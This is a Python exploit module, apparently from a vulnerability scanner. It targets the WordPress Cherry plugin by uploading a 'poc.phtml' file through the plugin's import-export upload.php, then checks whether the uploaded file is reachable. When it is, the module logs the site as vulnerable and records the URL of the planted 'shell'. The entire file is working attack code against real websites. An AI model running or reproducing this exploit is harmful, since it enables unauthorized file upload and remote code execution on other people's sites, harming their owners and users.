import sys
import os
from pathlib import Path
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(
        os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request

except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")

shell = {'filname': os.path.join(Path(__file__).parent.parent, 'poc.phtml')}


def exploit(url):
    try:
        req = request(url)
        found = []
        if not (url.startswith('https://') or url.startswith('http://')):

            url = 'http://' + url

        up = "wp-content/plugins/cherry-plugin/admin/import-export/upload.php"
        _Post = req.post(url + up, files=shell)
        _response = req.get(
            url +
            "wp-content/plugins/cherry-plugin/admin/import-export/poc.phtml")
        if "POC By ENG Yazeed" in _response.text:
            print(colors.yellow + "[+] ==> Cherry %s Vulnerable" % url)
            found.append({
                "url":
                url,
                "type":
                "Cherry RCE",
                "status":
                "Vulnerable",
                "shell":
                f"{url}/wp-content/plugins/cherry-plugin/admin/import-export/poc.phtml",
            })
            json_me(url, "Cherry RCE", found)
        else:
            print(colors.red + "[-] Cherry ==> %s Not Vulnerable" % url)

    except Exception as e:
        pass
